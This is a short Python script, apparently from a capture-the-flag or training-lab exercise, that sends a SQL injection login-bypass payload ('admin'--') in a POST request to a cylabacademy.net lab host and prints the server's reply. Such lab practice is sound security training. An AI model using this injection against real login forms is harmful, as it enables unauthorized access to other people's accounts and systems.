import sys, requests, urllib3
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
BASE = "http://xebec.cylabacademy.net:36284/"
r = requests.post(BASE, data={"name": "admin'--", "pass": "x"}, timeout=20)
print("status:", r.status_code, "len:", len(r.text))
print(r.text)
